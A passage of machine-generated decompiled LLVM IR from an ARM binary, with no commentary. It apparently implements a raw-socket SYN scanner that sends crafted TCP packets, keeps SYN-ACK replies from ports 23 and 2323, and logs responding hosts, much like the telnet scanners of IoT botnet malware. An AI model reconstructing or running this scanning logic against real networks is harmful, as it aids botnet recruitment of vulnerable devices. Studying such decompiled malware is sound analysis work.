  store i1 %v3_129c4, i1* %cpsr_c.global-to-local, align 1
  %v8_129c4 = icmp eq i32 %v1_128e0, 21
  store i1 %v8_129c4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_129c4, label %dec_label_pc_128dc, label %dec_label_pc_129cc

dec_label_pc_129cc:                               ; preds = %bb293
  %v2_129cc = icmp ugt i32 %v1_128e0, 27
  store i1 %v2_129cc, i1* %cpsr_c.global-to-local, align 1
  %v7_129cc = icmp eq i32 %v1_128e0, 28
  store i1 %v7_129cc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_129cc, label %dec_label_pc_128dc, label %bb294

bb294:                                            ; preds = %dec_label_pc_129cc
  %v3_129d0 = icmp ugt i32 %v1_128e0, 25
  store i1 %v3_129d0, i1* %cpsr_c.global-to-local, align 1
  %v8_129d0 = icmp eq i32 %v1_128e0, 26
  store i1 %v8_129d0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_129d0, label %dec_label_pc_128dc, label %dec_label_pc_129d8

dec_label_pc_129d8:                               ; preds = %bb294
  %v2_129d8 = icmp ugt i32 %v1_128e0, 29
  store i1 %v2_129d8, i1* %cpsr_c.global-to-local, align 1
  %v7_129d8 = icmp eq i32 %v1_128e0, 30
  store i1 %v7_129d8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_129d8, label %dec_label_pc_128dc, label %bb295

bb295:                                            ; preds = %dec_label_pc_129d8
  %v3_129dc = icmp ugt i32 %v1_128e0, 28
  store i1 %v3_129dc, i1* %cpsr_c.global-to-local, align 1
  %v8_129dc = icmp eq i32 %v1_128e0, 29
  store i1 %v8_129dc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_129dc, label %dec_label_pc_128dc, label %dec_label_pc_129e4

dec_label_pc_129e4:                               ; preds = %bb295
  %v2_129e4 = icmp ugt i32 %v1_128e0, 54
  store i1 %v2_129e4, i1* %cpsr_c.global-to-local, align 1
  %v7_129e4 = icmp eq i32 %v1_128e0, 55
  store i1 %v7_129e4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_129e4, label %dec_label_pc_128dc, label %bb296

bb296:                                            ; preds = %dec_label_pc_129e4
  %v3_129e8 = icmp ugt i32 %v1_128e0, 32
  store i1 %v3_129e8, i1* %cpsr_c.global-to-local, align 1
  %v8_129e8 = icmp eq i32 %v1_128e0, 33
  store i1 %v8_129e8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_129e8, label %dec_label_pc_128dc, label %dec_label_pc_129f0

dec_label_pc_129f0:                               ; preds = %bb296
  %v2_129f0 = icmp ugt i32 %v1_128e0, 214
  store i1 %v2_129f0, i1* %cpsr_c.global-to-local, align 1
  %v7_129f0 = icmp eq i32 %v1_128e0, 215
  store i1 %v7_129f0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_129f0, label %.thread32, label %bb297

bb297:                                            ; preds = %dec_label_pc_129f0
  %v3_129f4 = icmp ugt i32 %v1_128e0, 213
  store i1 %v3_129f4, i1* %cpsr_c.global-to-local, align 1
  %v8_129f4 = icmp eq i32 %v1_128e0, 214
  store i1 %v8_129f4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_129f4, label %bb298, label %dec_label_pc_12a04

.thread32:                                        ; preds = %dec_label_pc_129f0
  store i32 1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_128dc

bb298:                                            ; preds = %bb297
  store i32 1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_128dc

dec_label_pc_12a04:                               ; preds = %bb297
  store i32 0, i32* @r4, align 4
  %v5_12a10 = call i32 @llvm.bswap.i32(i32 %v0_128dc)
  store i32 %v5_12a10, i32* %r3.global-to-local, align 4
  %tmp299 = and i32 %v0_128dc, 65280
  %tmp300 = call i32 @llvm.bswap.i32(i32 %tmp299)
  %tmp301 = and i32 %v0_128dc, 16711680
  %tmp302 = call i32 @llvm.bswap.i32(i32 %tmp301)
  %v3_12a1c = mul nuw i32 %v3_128fc, 16777216
  %v3_12a20 = udiv i32 %tmp300, 256
  %v4_12a24 = mul nuw nsw i32 %tmp302, 256
  %tmp303 = and i32 %v0_128dc, 32768
  %v3_12a28 = icmp ne i32 %tmp303, 0
  store i1 %v3_12a28, i1* %cpsr_c.global-to-local, align 1
  %v4_12a28 = udiv i32 %v5_12a10, 16777216
  store i32 ptrtoint (i8** @global_var_1d978.259 to i32), i32* @r0, align 4
  %v5_12a28 = or i32 %v4_12a28, %v3_12a1c
  %v5_12a24 = or i32 %v5_12a28, %v4_12a24
  %v2_12a30 = or i32 %v5_12a24, %v3_12a20
  store i32 %v2_12a30, i32* %r2.global-to-local, align 4
  %v5_12a34 = trunc i32 %v4_12a28 to i8
  store i8 %v5_12a34, i8* @global_var_1d988.372, align 4
  store i32 20, i32* %r1.global-to-local, align 4
  store i8 0, i8* bitcast (i32* @global_var_1d982.373 to i8*), align 4
  store i8 0, i8* bitcast (i32* @global_var_1d983.374 to i8*), align 4
  %v3_12a44 = call i32 @function_fda0(i32 ptrtoint (i8** @global_var_1d978.259 to i32), i32 20)
  store i32 ptrtoint (i8** @global_var_1d978.259 to i32), i32* %ip.global-to-local, align 4
  %sext6 = mul i32 %v3_12a44, 16777216
  %v1_12a4c = sdiv i32 %sext6, 16777216
  store i32 %v1_12a4c, i32* %r3.global-to-local, align 4
  %v4_12a50 = ashr i32 %sext6, 31
  store i32 %v4_12a50, i32* %r2.global-to-local, align 4
  %v1_12a54 = trunc i32 %v1_12a4c to i8
  store i8 %v1_12a54, i8* bitcast (i32* @global_var_1d982.373 to i8*), align 4
  %v1_12a58 = trunc i32 %v4_12a50 to i8
  store i8 %v1_12a58, i8* bitcast (i32* @global_var_1d983.374 to i8*), align 4
  %v3_12a5c = load i32, i32* %stack_var_-52, align 4
  store i32 10, i32* %r1.global-to-local, align 4
  %v2_12a64 = srem i32 %v3_12a5c, 10
  store i32 %v2_12a64, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_12a68 = icmp eq i32 %v2_12a64, 0
  store i1 %v2_12a68, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_12a68, label %.thread198, label %bb304

.thread198:                                       ; preds = %dec_label_pc_12a04
  store i32 ptrtoint (i32* @global_var_1d98c.263 to i32), i32* @lr, align 4
  br label %.thread42.thread73

bb304:                                            ; preds = %dec_label_pc_12a04
  store i32 ptrtoint (i32* @global_var_1d98c.263 to i32), i32* %r0.global-to-local, align 4
  store i32 23, i32* %r3.global-to-local, align 4
  %v1_12a78 = load i32, i32* @r4, align 4
  %v2_12a78 = trunc i32 %v1_12a78 to i8
  store i8 %v2_12a78, i8* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_1d98c.263 to i32), i32 2) to i8*), align 2
  %v0_12a7c.pr.pre = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_12a7c.pr.pre, label %.thread42.thread73, label %.thread39

.thread39:                                        ; preds = %bb304
  %v1_12a7c = load i32, i32* %r3.global-to-local, align 4
  %v2_12a7c = trunc i32 %v1_12a7c to i8
  %v3_12a7c = load i32, i32* %r0.global-to-local, align 4
  %v4_12a7c = add i32 %v3_12a7c, 3
  %v5_12a7c = inttoptr i32 %v4_12a7c to i8*
  store i8 %v2_12a7c, i8* %v5_12a7c, align 1
  %v0_12a84.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  store i32 ptrtoint (i8** @global_var_1d978.259 to i32), i32* %r0.global-to-local, align 4
  br i1 %v0_12a84.pr.pr, label %.thread45, label %.thread47

.thread42.thread73:                               ; preds = %bb304, %.thread198
  store i32 ptrtoint (i8** @global_var_1d978.259 to i32), i32* %r0.global-to-local, align 4
  br label %.thread45

.thread45:                                        ; preds = %.thread39, %.thread42.thread73
  store i32 9, i32* %r3.global-to-local, align 4
  store i32 19, i32* %r2.global-to-local, align 4
  %v3_12a8c = load i32, i32* @lr, align 4
  %v4_12a8c = add i32 %v3_12a8c, 2
  %v5_12a8c = inttoptr i32 %v4_12a8c to i8*
  store i8 9, i8* %v5_12a8c, align 1
  %v0_12a90.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_12a90.pr.pr, label %bb305, label %.thread47

bb305:                                            ; preds = %.thread45
  %v1_12a90 = load i32, i32* %r2.global-to-local, align 4
  %v2_12a90 = trunc i32 %v1_12a90 to i8
  %v3_12a90 = load i32, i32* @lr, align 4
  %v4_12a90 = add i32 %v3_12a90, 3
  %v5_12a90 = inttoptr i32 %v4_12a90 to i8*
  store i8 %v2_12a90, i8* %v5_12a90, align 1
  br label %.thread47

.thread47:                                        ; preds = %.thread39, %.thread45, %bb305
  %v4_12a94 = load i8, i8* @global_var_1d988.372, align 1
  %v5_12a94 = sext i8 %v4_12a94 to i32
  store i32 %v5_12a94, i32* %ip.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1d98c.263 to i32), i32* %lr.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1d98c.263 to i32), i32* @r1, align 4
  store i8 %v4_12a94, i8* @global_var_1d990.375, align 4
  store i32 5120, i32* %r2.global-to-local, align 4
  store i32 20, i32* %r3.global-to-local, align 4
  %v0_12aac = load i32, i32* %sl.global-to-local, align 4
  %v1_12aac = trunc i32 %v0_12aac to i8
  store i8 %v1_12aac, i8* bitcast (i32* @global_var_1d99c.376 to i8*), align 4
  store i8 %v1_12aac, i8* bitcast (i32* @global_var_1d99d.377 to i8*), align 4
  %v5_12ab4 = call i32 @function_fdfc(i32 ptrtoint (i8** @global_var_1d978.259 to i32), i32 ptrtoint (i32* @global_var_1d98c.263 to i32), i32 5120, i32 20)
  %sext = mul i32 %v5_12ab4, 16777216
  %v1_12abc = sdiv i32 %sext, 16777216
  %v3_12ac4 = ashr i32 %sext, 31
  %v2_12ac8 = load i32, i32* @global_var_1d98c.263, align 4
  %v1_12ad0 = trunc i32 %v3_12ac4 to i8
  store i8 %v1_12ad0, i8* bitcast (i32* @global_var_1d99d.377 to i8*), align 4
  store i32 2, i32* %stack_var_-92, align 4
  %v3_12ae4 = load i8, i8* @global_var_1d988.372, align 1
  %v4_12ae4 = sext i8 %v3_12ae4 to i32
  store i32 %v4_12ae4, i32* %r4.global-to-local, align 4
  %v2_12ae8 = load i32, i32* @global_var_1d9cc.257, align 4
  store i32 %v2_12ae8, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1d98c.263 to i32), i32* %ip.global-to-local, align 4
  %v1_12af8 = and i32 %v2_12ac8, 8388608
  %v2_12af8 = icmp ne i32 %v1_12af8, 0
  store i1 %v2_12af8, i1* %cpsr_c.global-to-local, align 1
  %v1_12b00 = trunc i32 %v1_12abc to i8
  store i8 %v1_12b00, i8* bitcast (i32* @global_var_1d99c.376 to i8*), align 4
  store i32 ptrtoint (i8** @global_var_1d978.259 to i32), i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  store i32 %v2_12b14, i32* %lr.global-to-local, align 4
  store i32 40, i32* %r2.global-to-local, align 4
  %v7_12b28 = call i32 @_sendto(i32 %v2_12ae8, i32 ptrtoint (i8** @global_var_1d978.259 to i32), i32 40, i32 16384, i32 %v2_12b14, i32 16)
  store i32 %v7_12b28, i32* %r0.global-to-local, align 4
  %v3_12b2c = load i32, i32* %stack_var_-52, align 4
  %v1_12b30 = add i32 %v3_12b2c, 1
  store i32 %v1_12b30, i32* %r3.global-to-local, align 4
  %v3_12b34 = icmp ugt i32 %v1_12b30, 383
  store i1 %v3_12b34, i1* %cpsr_c.global-to-local, align 1
  %v8_12b34 = icmp eq i32 %v1_12b30, 384
  store i1 %v8_12b34, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_12b30, i32* %stack_var_-52, align 4
  %v5_12b3c = icmp slt i32 %v1_12b30, 384
  br i1 %v5_12b3c, label %.thread47.dec_label_pc_128ac_crit_edge, label %dec_label_pc_12b40

.thread47.dec_label_pc_128ac_crit_edge:           ; preds = %.thread47
  %v0_128ac.pre = load i32, i32* %sl.global-to-local, align 4
  br label %dec_label_pc_128ac

dec_label_pc_12b40:                               ; preds = %.thread47
  %v0_12b40 = load i32, i32* @r8, align 4
  br label %dec_label_pc_12b44

dec_label_pc_12b44:                               ; preds = %dec_label_pc_1288c, %dec_label_pc_12b40
  %stack_var_-1872.1 = phi i32 [ %stack_var_-1872.0, %dec_label_pc_1288c ], [ %v0_12b40, %dec_label_pc_12b40 ]
  %v0_12b44 = call i32 @___errno_location()
  store i32 %v0_12b44, i32* %r0.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  %v2_12b58 = inttoptr i32 %v0_12b44 to i32*
  %v1_12bac = add i32 %v0_12bbc, 16
  %v2_12bac = inttoptr i32 %v1_12bac to i32*
  %v4_12bc8 = ptrtoint i8* %stack_var_-1884.0 to i32
  %v1_12bd0 = add i32 %v4_12bc8, 1
  %v2_12bd0 = inttoptr i32 %v1_12bd0 to i8*
  %v1_12bf4 = add i32 %v4_12bc8, 2
  %v2_12bf4 = inttoptr i32 %v1_12bf4 to i8*
  %v1_12bf8 = add i32 %v4_12bc8, 3
  %v2_12bf8 = inttoptr i32 %v1_12bf8 to i8*
  %v4_12bfc = sext i8 %stack_var_-1876.0 to i32
  %v1_12cd8 = bitcast i8* %stack_var_-1884.0 to i32*
  %v1_12bbc = add i32 %v0_12bbc, 9
  %v2_12bbc = inttoptr i32 %v1_12bbc to i8*
  %v1_12c0c = add i32 %v4_12bc8, 13
  %v2_12c0c = inttoptr i32 %v1_12c0c to i8*
  %v1_12c30 = add i32 %v4_12bc8, 8
  %v2_12c30 = inttoptr i32 %v1_12c30 to i32*
  %v1_12c70 = add i32 %v0_12bbc, 12
  %v2_12c70 = inttoptr i32 %v1_12c70 to i32*
  br label %dec_label_pc_12b50

dec_label_pc_12b50:                               ; preds = %dec_label_pc_12c30, %dec_label_pc_12c28, %dec_label_pc_12c20, %dec_label_pc_12bf0, %dec_label_pc_12be0, %dec_label_pc_12bbc, %dec_label_pc_12ba4, %dec_label_pc_12c18, %dec_label_pc_12c0c, %dec_label_pc_12b9c, %dec_label_pc_12cd0, %dec_label_pc_12b44
  store i32 0, i32* %v2_12b58, align 4
  %v2_12b60 = load i32, i32* @global_var_1d9cc.257, align 4
  store i32 %v2_12b60, i32* %r0.global-to-local, align 4
  store i32 0, i32* %ip.global-to-local, align 4
  store i32 1514, i32* %r2.global-to-local, align 4
  store i32 %v0_12bbc, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v6_12b80 = call i32 @_recvfrom(i32 %v2_12b60, i32 %v0_12bbc, i32 1514, i32 16384, i32 0, i32 0)
  store i32 %v6_12b80, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_12b84 = icmp eq i32 %v6_12b80, 0
  store i1 %v2_12b84, i1* %cpsr_z.global-to-local, align 1
  %tmp306 = icmp slt i32 %v6_12b80, 1
  br i1 %tmp306, label %dec_label_pc_12d04, label %dec_label_pc_12b8c

dec_label_pc_12b8c:                               ; preds = %dec_label_pc_12b50
  store i32 %v0_12b44, i32* %lr.global-to-local, align 4
  %v2_12b90 = load i32, i32* %v2_12b58, align 4
  store i32 %v2_12b90, i32* %r3.global-to-local, align 4
  %v2_12b94 = icmp ugt i32 %v2_12b90, 10
  store i1 %v2_12b94, i1* %cpsr_c.global-to-local, align 1
  %v7_12b94 = icmp eq i32 %v2_12b90, 11
  store i1 %v7_12b94, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_12b94, label %dec_label_pc_12d04, label %dec_label_pc_12b9c

dec_label_pc_12b9c:                               ; preds = %dec_label_pc_12b8c
  %v2_12b9c = icmp ugt i32 %v6_12b80, 38
  store i1 %v2_12b9c, i1* %cpsr_c.global-to-local, align 1
  %v7_12b9c = icmp eq i32 %v6_12b80, 39
  store i1 %v7_12b9c, i1* %cpsr_z.global-to-local, align 1
  %v2_12ba0 = xor i1 %v2_12b9c, true
  %v3_12ba0 = or i1 %v7_12b9c, %v2_12ba0
  br i1 %v3_12ba0, label %dec_label_pc_12b50, label %dec_label_pc_12ba4

dec_label_pc_12ba4:                               ; preds = %dec_label_pc_12b9c
  store i32 %v0_12bbc, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1d9ac.143 to i32), i32* %r1.global-to-local, align 4
  %v3_12bac = load i32, i32* %v2_12bac, align 4
  store i32 %v3_12bac, i32* %r2.global-to-local, align 4
  %v2_12bb0 = load i32, i32* @global_var_1d9ac.143, align 4
  store i32 %v2_12bb0, i32* %r3.global-to-local, align 4
  %v3_12bb4 = icmp uge i32 %v3_12bac, %v2_12bb0
  store i1 %v3_12bb4, i1* %cpsr_c.global-to-local, align 1
  %v9_12bb4 = icmp eq i32 %v3_12bac, %v2_12bb0
  store i1 %v9_12bb4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_12bb4, label %dec_label_pc_12bbc, label %dec_label_pc_12b50

dec_label_pc_12bbc:                               ; preds = %dec_label_pc_12ba4
  %v3_12bbc = load i8, i8* %v2_12bbc, align 1
  %v4_12bbc = zext i8 %v3_12bbc to i32
  store i32 %v4_12bbc, i32* %r3.global-to-local, align 4
  %v2_12bc0 = icmp ugt i8 %v3_12bbc, 5
  store i1 %v2_12bc0, i1* %cpsr_c.global-to-local, align 1
  %v7_12bc0 = icmp eq i8 %v3_12bbc, 6
  store i1 %v7_12bc0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_12bc0, label %dec_label_pc_12bc8, label %dec_label_pc_12b50

dec_label_pc_12bc8:                               ; preds = %dec_label_pc_12bbc
  store i32 %v4_12bc8, i32* %r3.global-to-local, align 4
  %v2_12bcc = load i8, i8* %stack_var_-1884.0, align 1
  %v3_12bcc = zext i8 %v2_12bcc to i32
  store i32 %v3_12bcc, i32* %r2.global-to-local, align 4
  %v3_12bd0 = load i8, i8* %v2_12bd0, align 1
  %v4_12bd0 = zext i8 %v3_12bd0 to i32
  store i32 %v4_12bd0, i32* %r3.global-to-local, align 4
  %v4_12bd4 = mul nuw nsw i32 %v4_12bd0, 256
  %v5_12bd4 = or i32 %v4_12bd4, %v3_12bcc
  store i32 %v5_12bd4, i32* %r2.global-to-local, align 4
  %v2_12bd8 = icmp ugt i32 %v5_12bd4, 5887
  store i1 %v2_12bd8, i1* %cpsr_c.global-to-local, align 1
  %v7_12bd8 = icmp eq i32 %v5_12bd4, 5888
  store i1 %v7_12bd8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_12bd8, label %dec_label_pc_12bf0, label %dec_label_pc_12be0

dec_label_pc_12be0:                               ; preds = %dec_label_pc_12bc8
  store i32 4873, i32* %r3.global-to-local, align 4
  %v3_12be8 = icmp ugt i32 %v5_12bd4, 4872
  store i1 %v3_12be8, i1* %cpsr_c.global-to-local, align 1
  %v9_12be8 = icmp eq i32 %v5_12bd4, 4873
  store i1 %v9_12be8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_12be8, label %dec_label_pc_12bf0, label %dec_label_pc_12b50

dec_label_pc_12bf0:                               ; preds = %dec_label_pc_12be0, %dec_label_pc_12bc8
  store i32 %v4_12bc8, i32* %ip.global-to-local, align 4
  %v3_12bf4 = load i8, i8* %v2_12bf4, align 1
  %v4_12bf4 = zext i8 %v3_12bf4 to i32
  store i32 %v4_12bf4, i32* %r3.global-to-local, align 4
  %v3_12bf8 = load i8, i8* %v2_12bf8, align 1
  %v4_12bf8 = zext i8 %v3_12bf8 to i32
  store i32 %v4_12bf8, i32* %r2.global-to-local, align 4
  store i32 %v4_12bfc, i32* %lr.global-to-local, align 4
  %v4_12c00 = mul nuw nsw i32 %v4_12bf8, 256
  %v5_12c00 = or i32 %v4_12c00, %v4_12bf4
  store i32 %v5_12c00, i32* %r3.global-to-local, align 4
  %v3_12c04 = icmp uge i32 %v5_12c00, %v4_12bfc
  store i1 %v3_12c04, i1* %cpsr_c.global-to-local, align 1
  %v9_12c04 = icmp eq i32 %v5_12c00, %v4_12bfc
  store i1 %v9_12c04, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_12c04, label %dec_label_pc_12c0c, label %dec_label_pc_12b50

dec_label_pc_12c0c:                               ; preds = %dec_label_pc_12bf0
  %v3_12c0c = load i8, i8* %v2_12c0c, align 1
  %v4_12c0c = zext i8 %v3_12c0c to i32
  store i32 %v4_12c0c, i32* %r3.global-to-local, align 4
  %v1_12c10 = and i32 %v4_12c0c, 2
  %v2_12c10 = icmp eq i32 %v1_12c10, 0
  store i1 %v2_12c10, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_12c10, label %dec_label_pc_12b50, label %dec_label_pc_12c18

dec_label_pc_12c18:                               ; preds = %dec_label_pc_12c0c
  %v1_12c18 = and i32 %v4_12c0c, 16
  %v2_12c18 = icmp eq i32 %v1_12c18, 0
  store i1 %v2_12c18, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_12c18, label %dec_label_pc_12b50, label %dec_label_pc_12c20

dec_label_pc_12c20:                               ; preds = %dec_label_pc_12c18
  %v1_12c20 = and i32 %v4_12c0c, 4
  %v2_12c20 = icmp eq i32 %v1_12c20, 0
  store i1 %v2_12c20, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_12c20, label %dec_label_pc_12c28, label %dec_label_pc_12b50

dec_label_pc_12c28:                               ; preds = %dec_label_pc_12c20
  %tmp450 = urem i8 %v3_12c0c, 2
  %v2_12c28 = icmp eq i8 %tmp450, 0
  store i1 %v2_12c28, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_12c28, label %dec_label_pc_12c30, label %dec_label_pc_12b50

dec_label_pc_12c30:                               ; preds = %dec_label_pc_12c28
  %v3_12c30 = load i32, i32* %v2_12c30, align 4
  %v2_12c4c = call i32 @llvm.bswap.i32(i32 %v3_12c30)
  %v1_12c50 = add i32 %v2_12c4c, -1
  %v1_12c54 = udiv i32 %v1_12c50, 256
  %v3_12c58 = and i32 %v1_12c54, 65280
  %v1_12c5c = and i32 %v1_12c50, 65280
  store i32 %v1_12c5c, i32* %r2.global-to-local, align 4
  %v3_12c60 = mul i32 %v1_12c50, 16777216
  %v4_12c64 = udiv i32 %v1_12c50, 16777216
  %v5_12c64 = or i32 %v3_12c58, %v4_12c64
  store i32 %v5_12c64, i32* %r1.global-to-local, align 4
  store i32 %v0_12bbc, i32* %r3.global-to-local, align 4
  %v4_12c6c = mul nuw nsw i32 %v1_12c5c, 256
  %v5_12c6c = or i32 %v4_12c6c, %v3_12c60
  store i32 %v5_12c6c, i32* %r0.global-to-local, align 4
  %v3_12c70 = load i32, i32* %v2_12c70, align 4
  store i32 %v3_12c70, i32* %r2.global-to-local, align 4
  %v2_12c74 = call i32 @llvm.bswap.i32(i32 %v1_12c50)
  store i32 %v2_12c74, i32* %ip.global-to-local, align 4
  %v3_12c78 = icmp uge i32 %v2_12c74, %v3_12c70
  store i1 %v3_12c78, i1* %cpsr_c.global-to-local, align 1
  %v9_12c78 = icmp eq i32 %v2_12c74, %v3_12c70
  store i1 %v9_12c78, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_12c78, label %dec_label_pc_12c80, label %dec_label_pc_12b50

dec_label_pc_12c80:                               ; preds = %dec_label_pc_12c30
  %v0_12c80 = load i32, i32* @r4, align 4
  %v2_12c80 = icmp ugt i32 %v0_12c80, 254
  store i1 %v2_12c80, i1* %cpsr_c.global-to-local, align 1
  %v7_12c80 = icmp eq i32 %v0_12c80, 255
  store i1 %v7_12c80, i1* %cpsr_z.global-to-local, align 1
  %v8_12c84 = icmp sgt i32 %v0_12c80, 255
  br i1 %v8_12c84, label %dec_label_pc_12d04, label %dec_label_pc_12c88

dec_label_pc_12c88:                               ; preds = %dec_label_pc_12c80
  store i32 ptrtoint (i32* @global_var_1d9c8.255 to i32), i32* %lr.global-to-local, align 4
  %v3_12c8c = mul i32 %v0_12c80, 256
  store i32 %v3_12c8c, i32* %r2.global-to-local, align 4
  %v2_12c90 = load i32, i32* @global_var_1d9c8.255, align 4
  store i32 %v2_12c90, i32* %r1.global-to-local, align 4
  %v2_12c98 = mul i32 %v0_12c80, 288
  store i32 %v2_12c98, i32* %r3.global-to-local, align 4
  %v2_12c9c = add i32 %v2_12c90, %v2_12c98
  store i32 %v2_12c9c, i32* @r0, align 4
  %v1_12ca0 = add i32 %v2_12c9c, 12
  %v2_12ca0 = inttoptr i32 %v1_12ca0 to i32*
  %v3_12ca0 = load i32, i32* %v2_12ca0, align 4
  store i32 %v3_12ca0, i32* %r2.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_12ca4 = icmp eq i32 %v3_12ca0, 0
  store i1 %v2_12ca4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_12ca4, label %dec_label_pc_12cd0, label %dec_label_pc_12cb0.preheader

dec_label_pc_12cb0.preheader:                     ; preds = %dec_label_pc_12c88
  %v2_12ca8 = add i32 %v2_12c9c, 288
  store i32 %v2_12ca8, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_12cb0

dec_label_pc_12cb0:                               ; preds = %dec_label_pc_12cb0.preheader, %dec_label_pc_12cbc
  %v0_12cbc = phi i32 [ %v2_12ca8, %dec_label_pc_12cb0.preheader ], [ %v1_12cc8, %dec_label_pc_12cbc ]
  %v0_12cb0 = phi i32 [ %v0_12c80, %dec_label_pc_12cb0.preheader ], [ %v1_12cb0, %dec_label_pc_12cbc ]
  %v1_12cb0 = add i32 %v0_12cb0, 1
  store i32 %v1_12cb0, i32* @r4, align 4
  %v7_12cb4 = icmp eq i32 %v1_12cb0, 256
  br i1 %v7_12cb4, label %dec_label_pc_12d04.loopexit, label %dec_label_pc_12cbc

dec_label_pc_12cbc:                               ; preds = %dec_label_pc_12cb0
  store i32 %v0_12cbc, i32* @r0, align 4
  %v1_12cc0 = add i32 %v0_12cbc, 12
  %v2_12cc0 = inttoptr i32 %v1_12cc0 to i32*
  %v3_12cc0 = load i32, i32* %v2_12cc0, align 4
  %v2_12cc4 = icmp eq i32 %v3_12cc0, 0
  %v1_12cc8 = add i32 %v0_12cbc, 288
  store i32 %v1_12cc8, i32* %r3.global-to-local, align 4
  br i1 %v2_12cc4, label %dec_label_pc_12cd0.loopexit, label %dec_label_pc_12cb0

dec_label_pc_12cd0.loopexit:                      ; preds = %dec_label_pc_12cbc
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_12cd0

dec_label_pc_12cd0:                               ; preds = %dec_label_pc_12cd0.loopexit, %dec_label_pc_12c88
  %v1_12cd0 = phi i32 [ %v0_12cbc, %dec_label_pc_12cd0.loopexit ], [ %v2_12c9c, %dec_label_pc_12c88 ]
  %v2_12cd0 = add i32 %v1_12cd0, 16
  %v3_12cd0 = inttoptr i32 %v2_12cd0 to i32*
  store i32 %v3_12c70, i32* %v3_12cd0, align 4
  store i32 %v4_12bc8, i32* %r1.global-to-local, align 4
  %v2_12cd8 = load i32, i32* %v1_12cd8, align 4
  store i32 %v2_12cd8, i32* %r2.global-to-local, align 4
  %v1_12cdc = and i32 %v2_12cd8, 128
  %v2_12cdc = icmp ne i32 %v1_12cdc, 0
  store i1 %v2_12cdc, i1* %cpsr_c.global-to-local, align 1
  %v3_12cdc = sdiv i32 %v2_12cd8, 256
  store i32 %v3_12cdc, i32* %r3.global-to-local, align 4
  %v1_12ce0 = trunc i32 %v3_12cdc to i8
  %v2_12ce0 = load i32, i32* @r0, align 4
  %v3_12ce0 = add i32 %v2_12ce0, 21
  %v4_12ce0 = inttoptr i32 %v3_12ce0 to i8*
  store i8 %v1_12ce0, i8* %v4_12ce0, align 1
  %v0_12ce4 = load i32, i32* %r2.global-to-local, align 4
  %v1_12ce4 = trunc i32 %v0_12ce4 to i8
  %v2_12ce4 = load i32, i32* @r0, align 4
  %v3_12ce4 = add i32 %v2_12ce4, 20
  %v4_12ce4 = inttoptr i32 %v3_12ce4 to i8*
  store i8 %v1_12ce4, i8* %v4_12ce4, align 1
  %v0_12ce8 = call i32 @function_12020()
  store i32 %v0_12ce8, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_12b50

dec_label_pc_12cf0:                               ; preds = %dec_label_pc_12374
  store i32 ptrtoint (i32* @global_var_1d9cc.257 to i32), i32* %r2.global-to-local, align 4
  %v2_12cf4 = load i32, i32* @global_var_1d9cc.257, align 4
  store i32 %v2_12cf4, i32* %r0.global-to-local, align 4
  %v1_12cf8 = call i32 @_close(i32 %v2_12cf4)
  store i32 %v1_12cf8, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_12cfc

dec_label_pc_12cfc:                               ; preds = %dec_label_pc_1234c, %dec_label_pc_12cf0
  %v0_12cfc = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_12cfc, i32* %r0.global-to-local, align 4
  %v1_12d00 = call i32 @_exit(i32 %v0_12cfc)
  store i32 %v1_12d00, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_12d04

dec_label_pc_12d04.loopexit:                      ; preds = %dec_label_pc_12cb0
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_12d04

dec_label_pc_12d04:                               ; preds = %dec_label_pc_12c80, %dec_label_pc_12b8c, %dec_label_pc_12b50, %dec_label_pc_12d04.loopexit, %dec_label_pc_12cfc
  %stack_var_-1868.0 = phi i32 [ %tmp232, %dec_label_pc_12cfc ], [ %v0_12b44, %dec_label_pc_12d04.loopexit ], [ %v0_12b44, %dec_label_pc_12b50 ], [ %v0_12b44, %dec_label_pc_12b8c ], [ %v0_12b44, %dec_label_pc_12c80 ]
